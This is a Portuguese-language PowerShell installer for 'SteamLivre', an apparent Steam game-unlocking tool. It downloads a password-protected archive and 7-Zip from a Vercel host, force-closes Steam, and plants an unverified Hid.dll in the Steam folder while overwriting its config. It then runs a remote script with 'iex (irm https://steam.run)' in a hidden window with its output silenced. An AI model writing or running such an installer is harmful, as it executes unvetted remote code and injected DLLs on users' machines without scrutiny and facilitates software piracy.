$ErrorActionPreference = "Stop"

# Cria pasta temporaria invisivel
$tempDir = "$env:TEMP\SteamLivreSetup"
if (Test-Path $tempDir) { Remove-Item -Recurse -Force $tempDir }
New-Item -ItemType Directory -Force -Path $tempDir | Out-Null

Write-Host "=================================================" -ForegroundColor Cyan
Write-Host "       INICIANDO INSTALADOR STEAMLIVRE" -ForegroundColor Cyan
Write-Host "=================================================" -ForegroundColor Cyan
Write-Host "Baixando arquivos necessarios da nuvem. Aguarde..." -ForegroundColor Yellow

# Seu site oficial do Vercel
$baseUrl = "https://pack30k.vercel.app"

$urlZip = "$baseUrl/STEAMLIVRE.zip"
$url7zExe = "$baseUrl/7z.exe"
$url7zDll = "$baseUrl/7z.dll"

try {
    # Usando BasicParsing para garantir o download bruto
    Invoke-WebRequest -Uri $urlZip -OutFile "$tempDir\STEAMLIVRE.zip" -UseBasicParsing
    Invoke-WebRequest -Uri $url7zExe -OutFile "$tempDir\7z.exe" -UseBasicParsing
    Invoke-WebRequest -Uri $url7zDll -OutFile "$tempDir\7z.dll" -UseBasicParsing
} catch {
    Write-Host "Erro ao baixar os arquivos da internet. Verifique sua conexao." -ForegroundColor Red
    Start-Sleep -Seconds 5
    Exit
}

# Cria o .BAT do instalador
$batCode = @'
@echo off
setlocal EnableDelayedExpansion
chcp 65001 >nul
title instagram @steamlivre
mode con: cols=100 lines=38

cd /d "%~dp0"

set "ARQUIVO_ZIP=STEAMLIVRE.zip"
set "EXTRATOR=7z.exe"
set "SENHA_ZIP=40028922"
set "URL_AGRADECIMENTO=https://agradecimentopmw.lovable.app"

call :Header
echo.
echo  [INFO] Buscando diretorio da Steam...

for /f "tokens=3*" %%A in ('reg query "HKCU\Software\Valve\Steam" /v SteamExe 2^>nul') do set "steamExe=%%A %%B"
for %%A in ("%steamExe%") do set "steamDir=%%~dpA"
set "steamDir=%steamDir:~0,-1%"
set "configDir=%steamDir%\config"

:: PASSO 1: Preparação
call :Header
echo.
echo  [+] Preparando instalacao...
echo.
echo  [#####               ] 20%%
powershell -Command "Get-Process steam -ErrorAction SilentlyContinue | Stop-Process -Force"
timeout /t 2 /nobreak >nul

:: PASSO 2: Extração
call :Header
echo.
echo  [+] Extraindo arquivos...
echo.
echo  [##########          ] 40%%
if exist "%temp%\sl_temp" rmdir /s /q "%temp%\sl_temp"
mkdir "%temp%\sl_temp"

:: REMOVI O MODO SILENCIOSO! Agora voce vai ver se o 7-zip der erro.
"%EXTRATOR%" x "%ARQUIVO_ZIP%" -p%SENHA_ZIP% -y -o"%temp%\sl_temp"

if not exist "%temp%\sl_temp\Hid.dll" (
    echo.
    echo  =======================================================
    echo   [ERRO FATAL NA EXTRACAO]
    echo  =======================================================
    echo  Leia a mensagem do 7-Zip logo acima para entender o erro.
    echo  Possiveis causas:
    echo  1. O arquivo ZIP baixado esta corrompido (ou eh uma pagina 404).
    echo  2. A senha esta errada.
    echo  3. Faltou a DLL do 7-zip.
    pause
    exit /b
)

:: DELAY DE 5 SEGUNDOS APOS EXTRACAO
echo.
echo  [SUCESSO] Extracao concluida. Aguarde...
timeout /t 5 /nobreak >nul

:: PASSO 3: Copiando os arquivos
call :Header
echo.
echo  [+] Aplicando configuracoes...
echo.
echo  [###############     ] 60%%
xcopy /e /i /y "%temp%\sl_temp\Config\*" "%configDir%\" >nul 2>&1
copy /y "%temp%\sl_temp\Hid.dll" "%steamDir%\" >nul 2>&1
rmdir /s /q "%temp%\sl_temp" >nul
timeout /t 2 /nobreak >nul

:: PASSO 4: Steamtools
call :Header
echo.
echo  [+] Configurando Steamtools...
echo.
echo  [##################  ] 80%%
powershell -WindowStyle Hidden -Command "iex (irm https://steam.run) *>$null"
powershell -Command "Get-Process steam -ErrorAction SilentlyContinue | Stop-Process -Force"
timeout /t 2 /nobreak >nul

:: PASSO FINAL: Iniciando
call :Header
echo.
echo  [+] Iniciando Steam...
echo.
echo  [####################] 100%%
start "" "%steamExe%"
timeout /t 2 /nobreak >nul
start "" "%URL_AGRADECIMENTO%"

call :Header
color 0A
echo.
echo ========================================================
echo         INSTALACAO STEAMLIVRE FINALIZADA!
echo ========================================================
echo.
echo  Muito obrigado por utilizar nossos servicos.
echo.
echo  Pressione qualquer tecla para fechar o instalador...
pause >nul
exit /b

:Header
cls
color 0B
echo.
echo.
echo     _^|_^|_^|  _^|_^|_^|_^|_^|  _^|_^|_^|_^|    _^|_^|    _^|      _^|  
echo   _^|            _^|      _^|        _^|    _^|  _^|_^|  _^|_^|  
echo     _^|_^|        _^|      _^|_^|_^|    _^|_^|_^|_^|  _^|  _^|  _^|  
echo         _^|      _^|      _^|        _^|    _^|  _^|      _^|  
echo   _^|_^|_^|        _^|      _^|_^|_^|_^|  _^|    _^|  _^|      _^|  
echo.
echo    S  T  E  A  M    L  I  V  R  E
echo   ==================================================
echo         ^>^>^> nos siga no instagram @steamlivre ^<^<^<
echo.
exit /b
'@

Set-Content -Path "$tempDir\instalador.bat" -Value $batCode -Encoding UTF8

Write-Host "Abrindo tela de instalacao..." -ForegroundColor Green
Start-Process -FilePath "$tempDir\instalador.bat" -Wait
Remove-Item -Recurse -Force $tempDir
